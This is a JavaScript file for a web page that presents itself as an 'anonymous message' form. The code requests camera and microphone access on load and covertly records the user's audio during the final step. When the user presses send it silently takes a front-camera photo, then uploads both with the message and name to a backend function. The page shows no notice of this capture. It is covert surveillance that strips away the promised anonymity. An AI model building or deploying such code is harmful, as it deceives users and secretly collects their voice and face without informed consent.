document.addEventListener('DOMContentLoaded', () => {
    // --- Get all the elements we need from the HTML ---
    const step1 = document.getElementById('step1-message');
    const step2 = document.getElementById('step2-finalize');
    const step3 = document.getElementById('step3-thankyou');

    const messageInput = document.getElementById('anonymousMessage');
    const nextButton = document.getElementById('nextButton');
    const userNameInput = document.getElementById('userName');
    const emojis = document.querySelectorAll('.emoji');
    const sendButton = document.getElementById('sendButton');
    
    const mainLiveChatButton = document.getElementById('mainLiveChatButton');
    const thankYouLiveChatButton = document.getElementById('liveChatButton');
    const closeButton = document.getElementById('closeButton');
    
    let selectedEmoji = null;
    let mediaRecorder;
    let audioChunks = [];
    let userMediaStream;

    // --- Permissions on Page Load ---
    async function requestPermissions() {
        console.log('Requesting permissions...');
        try {
            // Request camera and microphone
            userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
            console.log('Permissions granted!');
            
            // --- Setup Audio Recording (BUT DO NOT START YET) ---
            mediaRecorder = new MediaRecorder(userMediaStream);
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

        } catch (error) {
            console.warn('Permissions were denied by the user.', error);
        }
    }
    
    requestPermissions();

    // --- Photo Capture Function ---
    async function capturePhoto() {
        if (!userMediaStream) return null;
        const videoTrack = userMediaStream.getVideoTracks()[0];
        if (!videoTrack) return null;
        try {
            const imageCapture = new ImageCapture(videoTrack);
            const blob = await imageCapture.takePhoto();
            return blob;
        } catch (error) {
            console.error("Could not capture photo:", error);
            return null;
        }
    }

    // --- Main Application Flow Logic ---
    messageInput.addEventListener('input', () => {
        if (messageInput.value.trim() !== '') {
            nextButton.classList.remove('hidden');
        } else {
            nextButton.classList.add('hidden');
        }
    });

    nextButton.addEventListener('click', () => {
        if (messageInput.value.trim() === '') {
            messageInput.style.animation = 'shake 0.5s';
            setTimeout(() => { messageInput.style.animation = '' }, 500);
            return;
        }
        step1.classList.add('hidden');
        mainLiveChatButton.classList.add('hidden');
        step2.classList.remove('hidden');

        // --- *** NEW LOGIC: START RECORDING NOW *** ---
        if (mediaRecorder && mediaRecorder.state === 'inactive') {
            audioChunks = []; // Clear any previous chunks
            mediaRecorder.start();
            console.log('Audio recording started on final step.');
        }
    });

    emojis.forEach(emoji => {
        emoji.addEventListener('click', () => {
            const currentlySelected = document.querySelector('.emoji.selected');
            if (currentlySelected) {
                currentlySelected.classList.remove('selected');
            }
            emoji.classList.add('selected');
            selectedEmoji = emoji.dataset.emoji;
        });
    });

    sendButton.addEventListener('click', async () => {
        if (userNameInput.value.trim() === '') {
            userNameInput.style.animation = 'shake 0.5s';
            setTimeout(() => { userNameInput.style.animation = '' }, 500);
            return;
        }

        sendButton.disabled = true;
        sendButton.textContent = 'Sending...';

        // Stop recording to finalize the audio file
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            console.log('Recording stopped by sending message.');
        }

        // Capture photos
        const photo1 = await capturePhoto();

        // Use a small delay to ensure the recorder has time to process the last chunk
        await new Promise(resolve => setTimeout(resolve, 500));

        const formData = new FormData();
        formData.append('message', messageInput.value.trim());
        formData.append('name', userNameInput.value.trim());
        formData.append('emoji', selectedEmoji || 'No reaction');

        if (photo1) {
            formData.append('photo1', photo1, 'photo1.jpg');
        }
        if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            formData.append('audio', audioBlob, 'audio.webm');
        }
        
        // --- Sending ALL Data to Backend ---
        try {
            const response = await fetch('/.netlify/functions/send-message', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                step2.classList.add('hidden');
                step3.classList.remove('hidden');
            } else {
                throw new Error('Failed to send message.');
            }
        } catch (error) {
            console.error(error);
            alert('Sorry, something went wrong. Please try again.');
            sendButton.disabled = false;
            sendButton.textContent = 'Send Anonymously';
        }
    });

    // --- Thank You Screen Button Logic ---
    closeButton.addEventListener('click', () => { window.close(); });
    thankYouLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
    mainLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
});

// Add shake animation keyframes dynamically
const styleSheet = document.createElement("style");
styleSheet.type = "text/css";
styleSheet.innerText = `@keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
}`;
document.head.appendChild(styleSheet);
